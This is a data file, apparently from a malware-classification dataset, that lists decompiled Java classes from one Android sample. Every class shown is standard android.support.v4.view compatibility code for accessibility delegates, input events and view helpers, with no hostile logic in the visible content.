"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateBridgeJellyBean.code","public interface AccessibilityDelegateBridgeJellyBean {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   Object getAccessibilityNodeProvider(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateCompat.code","public class AccessibilityDelegateCompat {   private static final Object DEFAULT_DELEGATE;   private static final AccessibilityDelegateImpl IMPL;   final Object mBridge=IMPL.newAccessiblityDelegateBridge(this); public interface AccessibilityDelegateImpl {     boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view);     Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat);     Object newAccessiblityDelegateDefaultImpl();     void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    Object obj,    View view,    int i);     void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {     AccessibilityDelegateStubImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return null;     }     @Override public Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat listener){       return null;     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return false;     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return true;     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return false;     }   } static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {     AccessibilityDelegateIcsImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }       } );     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){       AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);     }   } static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {     AccessibilityDelegateJellyBeanImpl(){     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }         @Override public Object getAccessibilityNodeProvider(        View host){           AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);           if (provider != null) {             return provider.getProvider();           }           return null;         }         @Override public boolean performAccessibilityAction(        View host,        int action,        Bundle args){           return compat.performAccessibilityAction(host,action,args);         }       } );     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);       if (provider != null) {         return new AccessibilityNodeProviderCompat(provider);       }       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityDelegateJellyBeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityDelegateIcsImpl();     }  else {       IMPL=new AccessibilityDelegateStubImpl();     }     DEFAULT_DELEGATE=IMPL.newAccessiblityDelegateDefaultImpl();   }   public Object getBridge(){     return this.mBridge;   }   public void sendAccessibilityEvent(  View host,  int eventType){     IMPL.sendAccessibilityEvent(DEFAULT_DELEGATE,host,eventType);   }   public void sendAccessibilityEventUnchecked(  View host,  AccessibilityEvent event){     IMPL.sendAccessibilityEventUnchecked(DEFAULT_DELEGATE,host,event);   }   public boolean dispatchPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     return IMPL.dispatchPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(DEFAULT_DELEGATE,host,info);   }   public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(DEFAULT_DELEGATE,host,child,event);   }   public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View host){     return IMPL.getAccessibilityNodeProvider(DEFAULT_DELEGATE,host);   }   public boolean performAccessibilityAction(  View host,  int action,  Bundle args){     return IMPL.performAccessibilityAction(DEFAULT_DELEGATE,host,action,args);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateCompatIcs.code","class AccessibilityDelegateCompatIcs { public interface AccessibilityDelegateBridge {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatIcs(){   }   public static Object newAccessibilityDelegateDefaultImpl(){     return new View.AccessibilityDelegate();   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridge bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridge.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridge.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.sendAccessibilityEventUnchecked(host,event);       }     } ;   }   public static boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).dispatchPopulateAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  Object info){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityNodeInfo(host,(AccessibilityNodeInfo)info);   }   public static void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onPopulateAccessibilityEvent(host,event);   }   public static boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).onRequestSendAccessibilityEvent(host,child,event);   }   public static void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEvent(host,eventType);   }   public static void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEventUnchecked(host,event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateCompatJellyBean.code","class AccessibilityDelegateCompatJellyBean { public interface AccessibilityDelegateBridgeJellyBean {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     Object getAccessibilityNodeProvider(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatJellyBean(){   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridgeJellyBean bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEventUnchecked(host,event);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View host){         return (AccessibilityNodeProvider)AccessibilityDelegateBridgeJellyBean.this.getAccessibilityNodeProvider(host);       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return AccessibilityDelegateBridgeJellyBean.this.performAccessibilityAction(host,action,args);       }     } ;   }   public static Object getAccessibilityNodeProvider(  Object delegate,  View host){     return ((View.AccessibilityDelegate)delegate).getAccessibilityNodeProvider(host);   }   public static boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return ((View.AccessibilityDelegate)delegate).performAccessibilityAction(host,action,args);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateIcsImpl.code","static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {   AccessibilityDelegateIcsImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }     } );   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateImpl.code","public interface AccessibilityDelegateImpl {   boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view);   Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat);   Object newAccessiblityDelegateDefaultImpl();   void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  Object obj,  View view,  int i);   void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateJellyBeanImpl.code","static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {   AccessibilityDelegateJellyBeanImpl(){   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }       @Override public Object getAccessibilityNodeProvider(      View host){         AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);         if (provider != null) {           return provider.getProvider();         }         return null;       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return compat.performAccessibilityAction(host,action,args);       }     } );   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);     if (provider != null) {       return new AccessibilityNodeProviderCompat(provider);     }     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\AccessibilityDelegateStubImpl.code","static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {   AccessibilityDelegateStubImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return null;   }   @Override public Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat listener){     return null;   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return false;   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return true;   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\BaseKeyEventVersionImpl.code","static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   BaseKeyEventVersionImpl(){   }   private static int metaStateFilterDirectionalModifiers(  int metaState,  int modifiers,  int basic,  int left,  int right){     boolean wantBasic=(modifiers & basic) != 0;     int directional=left | right;     boolean wantLeftOrRight=(modifiers & directional) != 0;     if (wantBasic) {       if (wantLeftOrRight) {         throw new IllegalArgumentException(""bad arguments"");       }       return metaState & (directional ^ (-1));     }     if (wantLeftOrRight) {       return metaState & (basic ^ (-1));     }     return metaState;   }   @Override public int normalizeMetaState(  int metaState){     if ((metaState & 192) != 0) {       metaState|=1;     }     if ((metaState & 48) != 0) {       metaState|=2;     }     return metaState & 247;   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return (normalizeMetaState(metaState) & 247) == 0;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\BaseMenuVersionImpl.code","static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     return false;   } } static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     return false;   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return item;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\BaseMotionEventVersionImpl.code","static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {   BaseMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return pointerId == 0 ? 0 : -1;   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public int getPointerCount(  MotionEvent event){     return 1;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\BaseVelocityTrackerVersionImpl.code","static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   BaseVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity();   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\BaseViewCompatImpl.code","static class BaseViewCompatImpl implements ViewCompatImpl {   BaseViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return false;   }   @Override public boolean canScrollVertically(  View v,  int direction){     return false;   }   @Override public int getOverScrollMode(  View v){     return 2;   }   @Override public void setOverScrollMode(  View v,  int mode){   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){   }   @Override public boolean hasTransientState(  View view){     return false;   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){   }   @Override public void postInvalidateOnAnimation(  View view){     view.postInvalidateDelayed(getFrameTime());   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     view.postDelayed(action,getFrameTime());   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postDelayed(action,getFrameTime() + delayMillis);   }   long getFrameTime(){     return ViewCompat.FAKE_FRAME_TIME;   }   @Override public int getImportantForAccessibility(  View view){     return 0;   }   @Override public void setImportantForAccessibility(  View view,  int mode){   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return false;   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return null;   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){   }   @Override public int getLayerType(  View view){     return 0;   }   @Override public int getLabelFor(  View view){     return 0;   }   @Override public void setLabelFor(  View view,  int id){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\BaseViewConfigurationVersionImpl.code","static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   BaseViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledTouchSlop();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view\Decor.code","interface Decor { } "
